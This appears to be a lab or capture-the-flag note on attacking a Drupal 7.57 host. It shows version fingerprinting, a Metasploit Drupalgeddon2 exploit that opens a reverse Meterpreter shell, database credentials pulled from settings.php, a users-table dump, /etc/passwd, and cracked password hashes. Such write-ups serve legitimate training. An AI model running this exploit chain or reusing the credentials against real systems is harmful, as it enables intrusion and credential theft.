## 11. What type of vulnerability can be exploited to elevate your privileges on the Linux host running Drupal?

| __Misconfigured SUDO Permissions__

Cron Job

Vulnerable Service

Locally Stored Credentials




https://www.youtube.com/watch?v=4lfFaDmp_9A&t=82s
https://blog.1nf1n1ty.team/hacktricks/network-services-pentesting/pentesting-web/drupal
[Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)](https://www.exploit-db.com/exploits/44557)


```bash
root@kali:~/drupal# curl -s http://192.168.100.52/drupal/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
root@kali:~/drupal# 

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set targeturi "/drupal/"
targeturi => /drupal/
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 192.168.100.52
RHOSTS => 192.168.100.52
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > exploit

[*] Started reverse TCP handler on 192.168.100.5:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (39282 bytes) to 192.168.100.52
[*] Meterpreter session 1 opened (192.168.100.5:4444 -> 192.168.100.52:48080 ) at 2025-12-14 00:12:03 +0530


```php
* @endcode
 */
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupal',
      'password' => 'syntex0421',
      'host' => 'localhost',
      'port' => '3306',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

```bash
mysql  -u drupal -psyntex0421 -e 'use drupal; select * from users';

```

```bash
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
rtkit:x:113:119:RealtimeKit,,,:/proc:/usr/sbin/nologin
xrdp:x:114:122::/run/xrdp:/usr/sbin/nologin
dnsmasq:x:115:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:116:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
avahi:x:117:123:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:118:124:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
pulse:x:119:125:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
geoclue:x:120:127::/var/lib/geoclue:/usr/sbin/nologin
saned:x:121:129::/var/lib/saned:/usr/sbin/nologin
colord:x:122:130:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
sddm:x:123:131:Simple Desktop Display Manager:/var/lib/sddm:/bin/false
gdm:x:124:132:Gnome Display Manager:/var/lib/gdm3:/bin/false
auditor:x:1001:1001::/home/auditor:/bin/bash
dbadmin:x:1002:1002::/home/dbadmin:/bin/bash
mysql:x:125:133:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:126:137:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```bash

```sql
uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone        language        picture init    data
0                                               NULL    0       0       0       0       NULL            0               NULL
1       admin   $S$D67i0qFmSLMLwZ9PU7VEocSS9fvV1JaSeJxQMgCid80hGbq6wXZH admin@syntex.com                        NULL    1650232322      1650248652      1650248498  1America/New_York                0       admin@syntex.com        b:0;
2       auditor $S$DV.wsqkmKY3y5VW.icW/g5NTU3h.UA01nxqL9Cro27GaSBYpH4WC auditor@syntex.com                      filtered_html   1650234408      0       0       1   America/New_York         0       auditor@syntex.com      b:0;
3       dbadmin $S$DZcGD5qcb6xso1E/Mu6DJP4uPi5DfY28kBEyuIab8Pod1saBaImN dbadmin@syntex.com                      filtered_html   1650248436      0       0       1   America/New_York         0       dbadmin@syntex.com      b:0;
4       Vincenzo        $S$DGnS.dK3q2FeWeNbLikdI5Hk/XdBFI2jBFkmPvv/v9Ln8vjIanIu vincenzo@syntext.com                    filtered_html   1650248490      0       0   1America/New_York                0       vincenzo@syntext.com    b:0;
5       bett0   $S$DLVo.pwdw9RDxbOYcDU0b4mf7X/rU.vTkIGxbjprOxZyshA54zl5 bett0@syntex.com                        filtered_html   1765649911      0       0       0   America/New_York         0       bett0@syntex.com        NULL
6       administrator   $S$DldxIVhi3hW28NqCm5a6VQmHRxA1x.2UbWf7E0dTEMdrsn4l6jg2 bett1@syntex.com                        filtered_html   1765649967      0       0   0America/New_York                0       bett1@syntex.com        NULL
7       ubuntu  $S$D5tZtu43Ai.km2GEdmrWeQJGNbP.ntQm.WkqtX7qP924VSsWguov bett2@syntex.com                        filtered_html   1765650167      0       0       0   America/New_York         0       bett2@syntex.com        NULL


$S$DZcGD5qcb6xso1E/Mu6DJP4uPi5DfY28kBEyuIab8Pod1saBaImN:sayang
dbadmin:sayang

$S$DGnS.dK3q2FeWeNbLikdI5Hk/XdBFI2jBFkmPvv/v9Ln8vjIanIu:789456
Vincenzo:789456

$S$DV.wsqkmKY3y5VW.icW/g5NTU3h.UA01nxqL9Cro27GaSBYpH4WC:qwertyuiop
auditor:qwertyuiop

```


![[Pasted image 20251213162121.png]]